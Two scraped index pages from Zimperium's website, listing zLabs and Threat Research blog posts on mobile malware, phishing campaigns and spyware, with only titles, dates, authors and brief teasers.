=== Content from www.zimperium.com_a759ad08_20250126_041218.html ===


[![Zimperium](data:image/svg+xml...)![Zimperium](https://www.zimperium.com/wp-content/uploads/2024/08/ZIMPERIUM-logo_orangeZ_white.png)
![Zimperium](data:image/svg+xml...)![Zimperium](https://www.zimperium.com/wp-content/uploads/2024/08/ZIMPERIUM-logo_orangeZ_white.png)](https://www.zimperium.com)

Search for:

* [Platform](https://www.zimperium.com/platform/)
* Products
  + MOBILE ENDPOINT SECURITY
    - [Zimperium MTD](https://www.zimperium.com/mtd/)
    - [Zimperium MTD for Chromebooks](https://www.zimperium.com/chromebooks/)
    - [z3A Application Vetting](https://www.zimperium.com/z3a-advanced-app-analysis/)
    - [zSecure Resident Safety](https://www.zimperium.com/zsecure/)
  + MOBILE APPLICATION SECURITY
    - [MAPS Mobile Application Protection Suite](https://www.zimperium.com/mobile-app-protection/)
    - [zScan Application Security Testing](https://www.zimperium.com/zscan/)
    - [zKeyBox Cryptographic Key Protection](https://www.zimperium.com/zkeybox/)
    - [zShield Application Shielding](https://www.zimperium.com/zshield/)
    - [zDefend Runtime Application Self-Protection](https://www.zimperium.com/zdefend/)
  + THREAT INTELLIGENCE
    - [Advanced Mobile Threat Insights](https://www.zimperium.com/support-advancedthreatinsights/)
    - [Mobile Threat Defense Maturity](https://www.zimperium.com/mtd-maturity-model/)
* Use Cases
  + [Combatting Mobile Banking Malware](https://www.zimperium.com/mobile-banking-malware/)
  + [Implementing Mobile Zero Trust](https://www.zimperium.com/zerotrust/)
  + [Securing Mobile O365](https://www.zimperium.com/secureoffice365/)
  + [Phishing Protection](https://www.zimperium.com/mobile-phishing-protection/)
  + [Ensuring Security Compliance](https://www.zimperium.com/industry/compliance/)
    - [MAS Regulations](/industry/compliance/regulations-mas/)
    - [PSD2 Regulation](https://www.zimperium.com/industry/compliance/psd2-regulation/)
    - [RMiT Regulation](https://www.zimperium.com/industry/compliance/rmit-regulation/)
  + [Neobank Security](https://www.zimperium.com/neobanks/)
  + [Protecting Mobile Payments](https://www.zimperium.com/mobile-payments/)
  + [SoftPOS Certification](https://www.zimperium.com/softpos-providers-secure-with-zimperium/)
  + [Mobile Threat Defense](https://www.zimperium.com/mobile-threat-defense/)
  + [Connected Medical Devices and Apps](https://www.zimperium.com/industry/healthcare/connected-medical-devices-and-apps/)
* [Industries](https://www.zimperium.com/industry/)
  + [Automotive](https://www.zimperium.com/industry/automotive/)
  + [Banking](/industry/banking/)
  + [Education](https://www.zimperium.com/industry/education/)
  + [Government](https://www.zimperium.com/industry/government/)
  + [State & Local Government](https://www.zimperium.com/state-local-government/)
  + [Healthcare](https://www.zimperium.com/industry/healthcare/)
  + [Insurance](https://www.zimperium.com/industry/insurance/)
  + [Legal](https://www.zimperium.com/?page_id=1284)
  + [Pharmaceutical](https://www.zimperium.com/industry/pharmaceutical/)
  + [Retail & Mobile E-Commerce](https://www.zimperium.com/industry/retail/)
  + [Media and Entertainment](https://www.zimperium.com/ott-app-security-for-media-and-entertainment/)
* Partners
  + [zPartners](https://www.zimperium.com/partners/)
  + [Become a Partner](https://www.zimperium.com/partner-contact/)
* [Company](https://www.zimperium.com/company/)
  + [About Zimperium](https://www.zimperium.com/company/)
  + [News](https://www.zimperium.com/resources/press-releases/)
  + [Careers](https://www.zimperium.com/careers/)
  + [Awards](https://www.zimperium.com/company/awards/)
  + [Contact Zimperium](https://www.zimperium.com/contact-us/)
* [Resources](https://www.zimperium.com/resources/)
  + [Resources](https://www.zimperium.com/resources/)
  + [Events](https://www.zimperium.com/events/)
  + [FAQs](https://www.zimperium.com/faq/)
  + [Glossary](https://www.zimperium.com/glossary/)
  + [Threat Research](https://www.zimperium.com/zlabs/)
* [Blog](/blog/)

Search for:

# All posts by zLabs

[Zimperium](https://www.zimperium.com "Go to Zimperium.") > Articles by: zLabs

 ![Avatar photo](https://secure.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=90)
##### Author: zLabs

## Posts by zLabs:

[![](https://www.zimperium.com/wp-content/uploads/2024/07/Code-Image.jpg)](https://www.zimperium.com/blog/a-network-of-harm-gigabud-threat-and-its-associates/ "A Network of Harm: Gigabud Threat and Its Associates")

September 12, 2024  [zLabs](https://www.zimperium.com/author/zlabs/ "Posts by zLabs")
## [A Network of Harm: Gigabud Threat and Its Associates](https://www.zimperium.com/blog/a-network-of-harm-gigabud-threat-and-its-associates/ "A Network of Harm: Gigabud Threat and Its Associates")

This article will focus on the Phishing Chronology. Analyzing 88014 phishing URLs collected from public sources and Zimperium data, we will show how dynamic and fast evolving are the phishing threats.

[Read more](https://www.zimperium.com/blog/a-network-of-harm-gigabud-threat-and-its-associates/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/07/Code-Image.jpg)](https://www.zimperium.com/blog/deep-dive-into-phishing-chronology-threats-and-trends/ "Deep Dive into Phishing Chronology: Threats and Trends ")

August 28, 2024  [zLabs](https://www.zimperium.com/author/zlabs/ "Posts by zLabs")
## [Deep Dive into Phishing Chronology: Threats and Trends](https://www.zimperium.com/blog/deep-dive-into-phishing-chronology-threats-and-trends/ "Deep Dive into Phishing Chronology: Threats and Trends ")

This article will focus on the Phishing Chronology. Analyzing 88014 phishing URLs collected from public sources and Zimperium data, we will show how dynamic and fast evolving are the phishing threats.

[Read more](https://www.zimperium.com/blog/deep-dive-into-phishing-chronology-threats-and-trends/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/05/ad_MITRE24_1a_1280x720px_notext1-1024x576.jpg)](https://www.zimperium.com/blog/blankbot_new_android_banking_trojan/ "BlankBot: A New Android Banking Trojan Cannot Evade on Device Machine Learning Protection")

August 12, 2024  [zLabs](https://www.zimperium.com/author/zlabs/ "Posts by zLabs")
## [BlankBot: A New Android Banking Trojan Cannot Evade on Device Machine Learning Protection](https://www.zimperium.com/blog/blankbot_new_android_banking_trojan/ "BlankBot: A New Android Banking Trojan Cannot Evade on Device Machine Learning Protection")

Learn the top 7 source code obfuscation techniques.

[Read more](https://www.zimperium.com/blog/blankbot_new_android_banking_trojan/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/07/Background-1024x535.jpg)](https://www.zimperium.com/blog/unmasking-the-sms-stealer-targeting-several-countries-with-deceptive-apps/ "Unmasking the SMS Stealer: Targeting Several Countries with Deceptive Apps")

July 31, 2024  [zLabs](https://www.zimperium.com/author/zlabs/ "Posts by zLabs")
## [Unmasking the SMS Stealer: Targeting Several Countries with Deceptive Apps](https://www.zimperium.com/blog/unmasking-the-sms-stealer-targeting-several-countries-with-deceptive-apps/ "Unmasking the SMS Stealer: Targeting Several Countries with Deceptive Apps")

In this blog post, we will dive into a large-scale, Android-targeted SMS stealer campaign that our zLabs team discovered and has tracked since February 2022

[Read more](https://www.zimperium.com/blog/unmasking-the-sms-stealer-targeting-several-countries-with-deceptive-apps/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2022/10/ad_dive_phishing_1a_1280x720px_blog-1024x576.jpg)](https://www.zimperium.com/blog/a-deeper-dive-into-phishing-attacks/ "A Deeper Dive into Phishing Attacks")

March 19, 2020  [zLabs](https://www.zimperium.com/author/zlabs/ "Posts by zLabs")
## [A Deeper Dive into Phishing Attacks](https://www.zimperium.com/blog/a-deeper-dive-into-phishing-attacks/ "A Deeper Dive into Phishing Attacks")

written and researched by Nicolás Chiaraviglio and Santiago A. Rodriguez As mentioned in our blog post on mobile phishing, there are different types of phishing attacks. Here, we’ll dig deeper into the different types that exist. Moreover, we’ll take a look at phishing kits, a tool that allows non-technical scammers […]

[Read more](https://www.zimperium.com/blog/a-deeper-dive-into-phishing-attacks/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2022/10/ad_gone_phishing_1b_1280x720px_blog-1024x576.jpg)](https://www.zimperium.com/blog/gone-mobile-phishing/ "Gone (Mobile) Phishing")

March 19, 2020  [zLabs](https://www.zimperium.com/author/zlabs/ "Posts by zLabs")
## [Gone (Mobile) Phishing](https://www.zimperium.com/blog/gone-mobile-phishing/ "Gone (Mobile) Phishing")

written and researched by Nicolás Chiaraviglio and Santiago A. Rodriguez CISOs worldwide are scrambling to address phishing attacks. In the second quarter of 2019 alone, there were close to 130 million phishing attacks, taking place on different types of devices within an enterprise – – desktops, laptops and mobile devices. […]

[Read more](https://www.zimperium.com/blog/gone-mobile-phishing/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2022/10/ad_z9AV_1b_1280x720px_blog-1024x576.jpg)](https://www.zimperium.com/blog/how-zimperiums-z9-detected-unknown-mobile-malware-overlooked-by-the-av-industry/ "How Zimperium’s z9 Detected Unknown Mobile Malware Overlooked by the AV Industry")

November 12, 2019  [zLabs](https://www.zimperium.com/author/zlabs/ "Posts by zLabs")
## [How Zimperium’s z9 Detected Unknown Mobile Malware Overlooked by the AV Industry](https://www.zimperium.com/blog/how-zimperiums-z9-detected-unknown-mobile-malware-overlooked-by-the-av-industry/ "How Zimperium’s z9 Detected Unknown Mobile Malware Overlooked by the AV Industry")

Introduction Thousands of new malicious apps are being released for mobile devices every day. And thousands more variations of older malware are being released too. Unfortunately, many of these new/old threats are not being detected by the existing mobile malware technology. Organizations need next generation machine learning-based solutions that can […]

[Read more](https://www.zimperium.com/blog/how-zimperiums-z9-detected-unknown-mobile-malware-overlooked-by-the-av-industry/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2022/10/ad_ml_1c_1280x720px_blog-1024x576.jpg)](https://www.zimperium.com/blog/zimperium-detects-malware-with-zero-industry-coverage/ "Machine Learning vs Signatures, Round N: Once Again, Zimperium Detects Malware No One Else Does")

February 28, 2019  [zLabs](https://www.zimperium.com/author/zlabs/ "Posts by zLabs")
## [Machine Learning vs Signatures, Round N: Once Again, Zimperium Detects Malware No One Else Does](https://www.zimperium.com/blog/zimperium-detects-malware-with-zero-industry-coverage/ "Machine Learning vs Signatures, Round N: Once Again, Zimperium Detects Malware No One Else Does")

Analysis & Post By: Alex Calleja (@alximw) Matteo Favaro (@fvrmatteo)     Advertising and click fraud campaigns are one of the most common mobile malware-based monetization techniques. Although they are considered a lawful income source in most app markets, they can put the user’s privacy at risk and even cause economic damage. Once […]

[Read more](https://www.zimperium.com/blog/zimperium-detects-malware-with-zero-industry-coverage/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2022/10/FreeRTOS-1024x576.jpg)](https://www.zimperium.com/blog/freertos-tcpip-stack-vulnerabilities-put-wide-range-devices-risk-compromise-smart-homes-critical-infrastructure-systems/ "FreeRTOS TCP/IP Stack Vulnerabilities Put A Wide Range of Devices at Risk of Compromise: From Smart Homes to Critical Infrastructure Systems")

October 18, 2018  [zLabs](https://www.zimperium.com/author/zlabs/ "Posts by zLabs")
## [FreeRTOS TCP/IP Stack Vulnerabilities Put A Wide Range of Devices at Risk of Compromise: From Smart Homes to Critical Infrastructure Systems](https://www.zimperium.com/blog/freertos-tcpip-stack-vulnerabilities-put-wide-range-devices-risk-compromise-smart-homes-critical-infrastructure-systems/ "FreeRTOS TCP/IP Stack Vulnerabilities Put A Wide Range of Devices at Risk of Compromise: From Smart Homes to Critical Infrastructure Systems")

Researchers: Ori Karliner (@oriHCX) Relevant Operating Systems: FreeRTOS up to V10.0.1 (with FreeRTOS+TCP), AWS FreeRTOS up to V1.3.1, WHIS OpenRTOS and SafeRTOS (With WHIS Connect middleware TCP/IP components) . CVE List: [wpsm\_comparison\_table id=”4″ class=””] As a part of our ongoing IoT platform research, zLabs recently analyzed some of the leading […]

[Read more](https://www.zimperium.com/blog/freertos-tcpip-stack-vulnerabilities-put-wide-range-devices-risk-compromise-smart-homes-critical-infrastructure-systems/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2022/10/PM_1b_blog_1200x628px-1024x536.jpg)](https://www.zimperium.com/blog/fake-play-market-zimperiums-z9-social-engineering-attack-vectors/ "Fake Play Market: Zimperium’s z9 against Social Engineering Attack Vectors")

September 19, 2018  [zLabs](https://www.zimperium.com/author/zlabs/ "Posts by zLabs")
## [Fake Play Market: Zimperium’s z9 against Social Engineering Attack Vectors](https://www.zimperium.com/blog/fake-play-market-zimperiums-z9-social-engineering-attack-vectors/ "Fake Play Market: Zimperium’s z9 against Social Engineering Attack Vectors")

Analysis & Post By: Alex Calleja (@alximw) Matteo Favaro (@fvrmatteo) Introduction Since the beginning of 2018, researchers in Zimperium’s zLabs have been tracking a rise in the frequency and sophistication of applications that have been loaded outside of the official Google Play Store. Many of these have leveraged social engineering techniques […]

[Read more](https://www.zimperium.com/blog/fake-play-market-zimperiums-z9-social-engineering-attack-vectors/)

## Posts pagination

1
[2](https://www.zimperium.com/author/zlabs/page/2/)
…
[5](https://www.zimperium.com/author/zlabs/page/5/)
[Next](https://www.zimperium.com/author/zlabs/page/2/)

Search for:

### Recent Posts

* [Zimperium Named Winner of the Coveted Top InfoSec Innovator Awards for 2024](https://www.zimperium.com/resources/zimperium-named-winner-of-the-coveted-top-infosec-innovator-awards-for-2024/)
* [2024 Global Mobile Threat Report](https://lp.zimperium.com/hubfs/MAPS_MTD/REPORT/GEN/Global%20Mobile%20Threat%20Report%202024%20FINAL%20%281%29.pdf#new_tab)
* [Zimperium’s Comprehensive Mobile Security Now Available in AWS Marketplace](https://www.zimperium.com/resources/zimperiums-comprehensive-mobile-security-now-available-in-aws-marketplace/)
### Categories

Select Category
Analysts
Android
App Security
Awards
BYOD
Chromebooks
CMMC
company announcement
Compliance
Corporate Emails
Development
Device Security
EDR
Endpoint Security
Events
Financial Services
Healthcare
iOS
Machine Learning
MAPS
MDM
mhealth
mobile app security
Mobile Gaming
Mobile Malware
Mobile Payments
Mobile Security
Mobile Threat Defense
mobile-first security
MPoC
News
O365
OWASP
Partners
Phishing
Public Sector
ransomware
resident safety
smishing
Software
spyware
Threat Research
Threat Research>N-Day
Windows
Zero Trust
Zimperium MTD (formerly zIPS)

 ![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/08/ZIMPERIUM-logo_orangeZ_white-300x46.png)

4055 Valley View Suite 300

Dallas, TX 75244

**US Toll Free:**  844-601-6760

**International:**  +1.415.992.8922

**General:** info@zimperium.com

**Press:** pr@zimperium.com

**[Compliance Hotline](https://my.compliancehotline.com/report/zimperium)**

**[Modern Slavery Act Statement](https://www.zimperium.com/modern-slavery-act-statement/)**

##### Learn More

* [FAQ](https://www.zimperium.com/faq/)
* [Support](https://www.zimperium.com/support/)
* [Blog](https://www.zimperium.com/blog/)
* [Threat Research](https://www.zimperium.com/zlabs/)
* [Glossary](https://www.zimperium.com/glossary/)
* [Responsible Disclosure Policy](https://lp.zimperium.com/hubfs/Zimperium/Zimperium%20Vulnerability%20Disclosure%20Policy%20%281%29.pdf)

##### Our Focus

* [Mobile Threat Defense](https://www.zimperium.com/mobile-threat-defense/)
* [Mobile Application Security](https://www.zimperium.com/mobile-app-security/)
* [Enterprise Mobile Security](https://www.zimperium.com/enterprise-mobile-security/)
* [Mobile Phishing Protection](https://www.zimperium.com/mobile-phishing-protection/)
* [Mobile EDR](https://www.zimperium.com/mobile-edr/)

Copyright © 2010-2024 Zimperium.  All Rights Reserved.[Privacy Policy](https://www.zimperium.com/privacy-policy/)  | Privacy Settings



=== Content from www.zimperium.com_5cc415c8_20250126_041217.html ===


[![Zimperium](data:image/svg+xml...)![Zimperium](https://www.zimperium.com/wp-content/uploads/2024/08/ZIMPERIUM-logo_orangeZ_white.png)
![Zimperium](data:image/svg+xml...)![Zimperium](https://www.zimperium.com/wp-content/uploads/2024/08/ZIMPERIUM-logo_orangeZ_white.png)](https://www.zimperium.com)

Search for:

* [Platform](https://www.zimperium.com/platform/)
* Products
  + MOBILE ENDPOINT SECURITY
    - [Zimperium MTD](https://www.zimperium.com/mtd/)
    - [Zimperium MTD for Chromebooks](https://www.zimperium.com/chromebooks/)
    - [z3A Application Vetting](https://www.zimperium.com/z3a-advanced-app-analysis/)
    - [zSecure Resident Safety](https://www.zimperium.com/zsecure/)
  + MOBILE APPLICATION SECURITY
    - [MAPS Mobile Application Protection Suite](https://www.zimperium.com/mobile-app-protection/)
    - [zScan Application Security Testing](https://www.zimperium.com/zscan/)
    - [zKeyBox Cryptographic Key Protection](https://www.zimperium.com/zkeybox/)
    - [zShield Application Shielding](https://www.zimperium.com/zshield/)
    - [zDefend Runtime Application Self-Protection](https://www.zimperium.com/zdefend/)
  + THREAT INTELLIGENCE
    - [Advanced Mobile Threat Insights](https://www.zimperium.com/support-advancedthreatinsights/)
    - [Mobile Threat Defense Maturity](https://www.zimperium.com/mtd-maturity-model/)
* Use Cases
  + [Combatting Mobile Banking Malware](https://www.zimperium.com/mobile-banking-malware/)
  + [Implementing Mobile Zero Trust](https://www.zimperium.com/zerotrust/)
  + [Securing Mobile O365](https://www.zimperium.com/secureoffice365/)
  + [Phishing Protection](https://www.zimperium.com/mobile-phishing-protection/)
  + [Ensuring Security Compliance](https://www.zimperium.com/industry/compliance/)
    - [MAS Regulations](/industry/compliance/regulations-mas/)
    - [PSD2 Regulation](https://www.zimperium.com/industry/compliance/psd2-regulation/)
    - [RMiT Regulation](https://www.zimperium.com/industry/compliance/rmit-regulation/)
  + [Neobank Security](https://www.zimperium.com/neobanks/)
  + [Protecting Mobile Payments](https://www.zimperium.com/mobile-payments/)
  + [SoftPOS Certification](https://www.zimperium.com/softpos-providers-secure-with-zimperium/)
  + [Mobile Threat Defense](https://www.zimperium.com/mobile-threat-defense/)
  + [Connected Medical Devices and Apps](https://www.zimperium.com/industry/healthcare/connected-medical-devices-and-apps/)
* [Industries](https://www.zimperium.com/industry/)
  + [Automotive](https://www.zimperium.com/industry/automotive/)
  + [Banking](/industry/banking/)
  + [Education](https://www.zimperium.com/industry/education/)
  + [Government](https://www.zimperium.com/industry/government/)
  + [State & Local Government](https://www.zimperium.com/state-local-government/)
  + [Healthcare](https://www.zimperium.com/industry/healthcare/)
  + [Insurance](https://www.zimperium.com/industry/insurance/)
  + [Legal](https://www.zimperium.com/?page_id=1284)
  + [Pharmaceutical](https://www.zimperium.com/industry/pharmaceutical/)
  + [Retail & Mobile E-Commerce](https://www.zimperium.com/industry/retail/)
  + [Media and Entertainment](https://www.zimperium.com/ott-app-security-for-media-and-entertainment/)
* Partners
  + [zPartners](https://www.zimperium.com/partners/)
  + [Become a Partner](https://www.zimperium.com/partner-contact/)
* [Company](https://www.zimperium.com/company/)
  + [About Zimperium](https://www.zimperium.com/company/)
  + [News](https://www.zimperium.com/resources/press-releases/)
  + [Careers](https://www.zimperium.com/careers/)
  + [Awards](https://www.zimperium.com/company/awards/)
  + [Contact Zimperium](https://www.zimperium.com/contact-us/)
* [Resources](https://www.zimperium.com/resources/)
  + [Resources](https://www.zimperium.com/resources/)
  + [Events](https://www.zimperium.com/events/)
  + [FAQs](https://www.zimperium.com/faq/)
  + [Glossary](https://www.zimperium.com/glossary/)
  + [Threat Research](https://www.zimperium.com/zlabs/)
* [Blog](/blog/)

Search for:

# Currently browsing: Threat Research

[Zimperium](https://www.zimperium.com "Go to Zimperium.") > [Blogs](https://www.zimperium.com/blog/ "Go to Blogs.") > Threat Research

[![](https://www.zimperium.com/wp-content/uploads/2024/05/ad_MITRE24_1a_1280x720px_notext1-1024x576.jpg)](https://www.zimperium.com/blog/android-malware-in-donot-apt-operations-and-extended-indicators-of-compromise/ "Zimperium’s Coverage Against Android Malware in Donot APT Operations and Extended Indicators of Compromise")

January 23, 2025  [Nicolás Chiaraviglio](https://www.zimperium.com/author/nico-chiaraviglio/ "Posts by Nicolás Chiaraviglio")
## [Zimperium’s Coverage Against Android Malware in Donot APT Operations and Extended Indicators of Compromise](https://www.zimperium.com/blog/android-malware-in-donot-apt-operations-and-extended-indicators-of-compromise/ "Zimperium’s Coverage Against Android Malware in Donot APT Operations and Extended Indicators of Compromise")

Take a look at Zimperium’s coverage against Android malware in Donot APT operations and extended indicators of compromise.

[Read more](https://www.zimperium.com/blog/android-malware-in-donot-apt-operations-and-extended-indicators-of-compromise/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/05/ad_MITRE24_1a_1280x720px_notext1-1024x576.jpg)](https://www.zimperium.com/blog/how-zimperium-can-help-with-advanced-spyware-such-as-novispy/ "How Zimperium Can Help With Advanced Spyware Such as NoviSpy")

December 20, 2024  [Nicolás Chiaraviglio](https://www.zimperium.com/author/nico-chiaraviglio/ "Posts by Nicolás Chiaraviglio")
## [How Zimperium Can Help With Advanced Spyware Such as NoviSpy](https://www.zimperium.com/blog/how-zimperium-can-help-with-advanced-spyware-such-as-novispy/ "How Zimperium Can Help With Advanced Spyware Such as NoviSpy")

Discover how Zimperium can help with advanced spyware such as NoviSpy.

[Read more](https://www.zimperium.com/blog/how-zimperium-can-help-with-advanced-spyware-such-as-novispy/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/10/1-1.jpg)](https://www.zimperium.com/blog/mobile-spear-phishing-targets-executive-teams/ "Mobile Spear Phishing Targets Executive Teams")

December 18, 2024  [Santiago Rodriguez](https://www.zimperium.com/author/santiagorodriguez/ "Posts by Santiago Rodriguez")
## [Mobile Spear Phishing Targets Executive Teams](https://www.zimperium.com/blog/mobile-spear-phishing-targets-executive-teams/ "Mobile Spear Phishing Targets Executive Teams")

Over the past few months, enterprises have observed a pattern of sophisticated spearphishing attempts targeting their executives, with some specifically targeting their mobile devices. Our blog shares the details.

[Read more](https://www.zimperium.com/blog/mobile-spear-phishing-targets-executive-teams/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/10/1-1.jpg)](https://www.zimperium.com/blog/mishing-in-motion-uncovering-the-evolving-functionality-of-fakecall-malware/ "Mishing in Motion: Uncovering the Evolving Functionality of FakeCall Malware")

October 30, 2024  [Fernando Ortega](https://www.zimperium.com/author/fernandosanchez/ "Posts by Fernando Ortega")
## [Mishing in Motion: Uncovering the Evolving Functionality of FakeCall Malware](https://www.zimperium.com/blog/mishing-in-motion-uncovering-the-evolving-functionality-of-fakecall-malware/ "Mishing in Motion: Uncovering the Evolving Functionality of FakeCall Malware")

In this blog post we share Zimperium’s Zero-Day Protection against the Water Makara Spear-Phishing campaign.

[Read more](https://www.zimperium.com/blog/mishing-in-motion-uncovering-the-evolving-functionality-of-fakecall-malware/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/10/1-1.jpg)](https://www.zimperium.com/blog/zimperiums-zero-day-protection-against-water-makara-spear-phishing-campaign/ "Zimperium’s Zero-Day Protection Against Water Makara Spear-Phishing Campaign")

October 21, 2024  [Nicolás Chiaraviglio](https://www.zimperium.com/author/nico-chiaraviglio/ "Posts by Nicolás Chiaraviglio")
## [Zimperium’s Zero-Day Protection Against Water Makara Spear-Phishing Campaign](https://www.zimperium.com/blog/zimperiums-zero-day-protection-against-water-makara-spear-phishing-campaign/ "Zimperium’s Zero-Day Protection Against Water Makara Spear-Phishing Campaign")

In this blog post we share Zimperium’s Zero-Day Protection against the Water Makara Spear-Phishing campaign.

[Read more](https://www.zimperium.com/blog/zimperiums-zero-day-protection-against-water-makara-spear-phishing-campaign/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/05/Background-1024x535.jpg)](https://www.zimperium.com/blog/the-necro-n-chronicles-volume-101/ "The Mobile Malware Chronicles: Necro.N – Volume 101")

October 18, 2024  [Rajat Goyal](https://www.zimperium.com/author/rajat-goyal/ "Posts by Rajat Goyal")
## [The Mobile Malware Chronicles: Necro.N – Volume 101](https://www.zimperium.com/blog/the-necro-n-chronicles-volume-101/ "The Mobile Malware Chronicles: Necro.N – Volume 101")

Zimperium researchers analyze Necro.N and focuses on the differences and elements.

[Read more](https://www.zimperium.com/blog/the-necro-n-chronicles-volume-101/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/06/Title.jpg)](https://www.zimperium.com/blog/expanding-the-investigation-deep-dive-into-latest-trickmo-samples/ "Expanding the Investigation: Deep Dive into Latest TrickMo Samples")

October 11, 2024  [Aazim Yaswant](https://www.zimperium.com/author/aazim-bill-se-yaswant/ "Posts by Aazim Yaswant")
## [Expanding the Investigation: Deep Dive into Latest TrickMo Samples](https://www.zimperium.com/blog/expanding-the-investigation-deep-dive-into-latest-trickmo-samples/ "Expanding the Investigation: Deep Dive into Latest TrickMo Samples")

Our analysis of TrickMo suggests that many of these samples remain undetected by the broader security community.

[Read more](https://www.zimperium.com/blog/expanding-the-investigation-deep-dive-into-latest-trickmo-samples/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/10/1-1.jpg)](https://www.zimperium.com/blog/ios-and-the-webp-vulnerability-patching-matter/ "iOS and the WebP Vulnerability")

October 7, 2024  [Antonio Nappa](https://www.zimperium.com/author/antonio-nappa/ "Posts by Antonio Nappa")
## [iOS and the WebP Vulnerability](https://www.zimperium.com/blog/ios-and-the-webp-vulnerability-patching-matter/ "iOS and the WebP Vulnerability")

In this blog post we will underline the differences and the similarities on how iOS developers reacted to the WebP vulnerability and our observed patching trends of those iOS applications.

[Read more](https://www.zimperium.com/blog/ios-and-the-webp-vulnerability-patching-matter/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/06/Title.jpg)](https://www.zimperium.com/blog/zimperiums-zero-day-defense-against-octo2-malware-targeting-european-banks/ "Zimperium’s Zero-Day Defense Against Octo2 Malware Targeting European Banks")

October 7, 2024  [Nicolás Chiaraviglio](https://www.zimperium.com/author/nico-chiaraviglio/ "Posts by Nicolás Chiaraviglio")
## [Zimperium’s Zero-Day Defense Against Octo2 Malware Targeting European Banks](https://www.zimperium.com/blog/zimperiums-zero-day-defense-against-octo2-malware-targeting-european-banks/ "Zimperium’s Zero-Day Defense Against Octo2 Malware Targeting European Banks")

Zimperium’s Mobile Threat Defense (MTD) and its Mobile App Protection Suite (MAPS) solution provide robust protection against Octo2, detecting all known samples in a zero-day fashion.

[Read more](https://www.zimperium.com/blog/zimperiums-zero-day-defense-against-octo2-malware-targeting-european-banks/)

[![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/06/Title.jpg)](https://www.zimperium.com/blog/zimperium-coverage-on-coldriver-phishing-campaign/ "Zimperium Coverage on COLDRIVER Phishing Campaign ")

October 1, 2024  [Santiago Rodriguez](https://www.zimperium.com/author/santiagorodriguez/ "Posts by Santiago Rodriguez")
## [Zimperium Coverage on COLDRIVER Phishing Campaign](https://www.zimperium.com/blog/zimperium-coverage-on-coldriver-phishing-campaign/ "Zimperium Coverage on COLDRIVER Phishing Campaign ")

The recently uncovered “River of Phish” campaign, attributed to the Russian threat actor COLDRIVER, targets Western and Russian civil society through sophisticated spear-phishing attacks.

[Read more](https://www.zimperium.com/blog/zimperium-coverage-on-coldriver-phishing-campaign/)

* [1](https://www.zimperium.com/blog-category/threat-research/)
* [2](https://www.zimperium.com/blog-category/threat-research/page/2/)
* [3](https://www.zimperium.com/blog-category/threat-research/page/3/)
* ...
* [11](https://www.zimperium.com/blog-category/threat-research/page/11/)
* [Next Page »](https://www.zimperium.com/blog-category/threat-research/page/2/)

Search for:

### Recent Posts

* [Zimperium Named Winner of the Coveted Top InfoSec Innovator Awards for 2024](https://www.zimperium.com/resources/zimperium-named-winner-of-the-coveted-top-infosec-innovator-awards-for-2024/)
* [2024 Global Mobile Threat Report](https://lp.zimperium.com/hubfs/MAPS_MTD/REPORT/GEN/Global%20Mobile%20Threat%20Report%202024%20FINAL%20%281%29.pdf#new_tab)
* [Zimperium’s Comprehensive Mobile Security Now Available in AWS Marketplace](https://www.zimperium.com/resources/zimperiums-comprehensive-mobile-security-now-available-in-aws-marketplace/)
### Categories

Select Category
Analysts
Android
App Security
Awards
BYOD
Chromebooks
CMMC
company announcement
Compliance
Corporate Emails
Development
Device Security
EDR
Endpoint Security
Events
Financial Services
Healthcare
iOS
Machine Learning
MAPS
MDM
mhealth
mobile app security
Mobile Gaming
Mobile Malware
Mobile Payments
Mobile Security
Mobile Threat Defense
mobile-first security
MPoC
News
O365
OWASP
Partners
Phishing
Public Sector
ransomware
resident safety
smishing
Software
spyware
Threat Research
Threat Research>N-Day
Windows
Zero Trust
Zimperium MTD (formerly zIPS)

 ![](data:image/svg+xml...)![](https://www.zimperium.com/wp-content/uploads/2024/08/ZIMPERIUM-logo_orangeZ_white-300x46.png)

4055 Valley View Suite 300

Dallas, TX 75244

**US Toll Free:**  844-601-6760

**International:**  +1.415.992.8922

**General:** info@zimperium.com

**Press:** pr@zimperium.com

**[Compliance Hotline](https://my.compliancehotline.com/report/zimperium)**

**[Modern Slavery Act Statement](https://www.zimperium.com/modern-slavery-act-statement/)**

##### Learn More

* [FAQ](https://www.zimperium.com/faq/)
* [Support](https://www.zimperium.com/support/)
* [Blog](https://www.zimperium.com/blog/)
* [Threat Research](https://www.zimperium.com/zlabs/)
* [Glossary](https://www.zimperium.com/glossary/)
* [Responsible Disclosure Policy](https://lp.zimperium.com/hubfs/Zimperium/Zimperium%20Vulnerability%20Disclosure%20Policy%20%281%29.pdf)

##### Our Focus

* [Mobile Threat Defense](https://www.zimperium.com/mobile-threat-defense/)
* [Mobile Application Security](https://www.zimperium.com/mobile-app-security/)
* [Enterprise Mobile Security](https://www.zimperium.com/enterprise-mobile-security/)
* [Mobile Phishing Protection](https://www.zimperium.com/mobile-phishing-protection/)
* [Mobile EDR](https://www.zimperium.com/mobile-edr/)

Copyright © 2010-2024 Zimperium.  All Rights Reserved.[Privacy Policy](https://www.zimperium.com/privacy-policy/)  | Privacy Settings



